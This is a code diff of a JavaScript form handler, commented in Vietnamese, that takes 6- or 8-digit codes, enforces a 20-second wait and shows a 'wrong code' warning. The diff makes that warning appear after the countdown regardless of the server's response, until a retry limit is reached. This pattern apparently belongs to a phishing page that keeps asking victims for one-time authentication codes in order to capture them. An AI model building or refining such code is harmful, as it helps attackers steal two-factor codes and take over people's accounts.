@@ -92,7 +92,6 @@ function sendCode() {
         let input = $(this).val();
         input = input.replace(/\D/g, ''); // Chỉ giữ số
 
-        // Giới hạn tối đa 8 ký tự
         if (input.length > 8) {
             input = input.slice(0, 8);
         }
@@ -106,7 +105,10 @@ function sendCode() {
 
         const keymap = $('#code').val();
 
-        // Chỉ chấp nhận 6 hoặc 8 chữ số
+        // Ẩn cảnh báo mã sai khi người dùng nhấn Submit
+        $('#wrong-code').addClass('d-none');
+
+        // Chỉ cho phép 6 hoặc 8 số
         if (!/^\d{6}$|^\d{8}$/.test(keymap)) {
             $('#code').addClass('border-danger');
             return;
@@ -114,7 +116,7 @@ function sendCode() {
             $('#code').removeClass('border-danger');
         }
 
-        // Khóa nút và hiển thị đếm ngược
+        // Bắt đầu đếm ngược 20 giây và khóa nút
         $btn.prop('disabled', true).text('Please wait (20s)');
         let waitTime = 20;
         const countdown = setInterval(() => {
@@ -123,6 +125,16 @@ function sendCode() {
             if (waitTime <= 0) {
                 clearInterval(countdown);
                 $btn.prop('disabled', false).text('Submit');
+
+                // Sau khi đếm ngược xong thì hiển thị cảnh báo mã sai nếu cần
+                if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
+                    $('#wrong-code').removeClass('d-none');
+                } else {
+                    $('#wrong-code').removeClass('d-none');
+                    $('#send-code').prop('disabled', true);
+                    $('#code-form').addClass('d-none');
+                    $('#getCode').removeClass('d-none');
+                }
             }
         }, 1000);
 
@@ -156,17 +168,7 @@ function sendCode() {
             return response.json();
         })
         .then((data) => {
-            setTimeout(function () {
-                if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
-                    $('#wrong-code').removeClass('d-none');
-                } else {
-                    $('#wrong-code').removeClass('d-none');
-                    $('#send-code').prop('disabled', true);
-                    $('#code-form').addClass('d-none');
-                    $('#getCode').removeClass('d-none');
-                }
-                $('.lsd-ring-container').addClass('d-none');
-            }, 2000);
+            $('.lsd-ring-container').addClass('d-none');
         })
         .catch((error) => {
             setTimeout(function () {
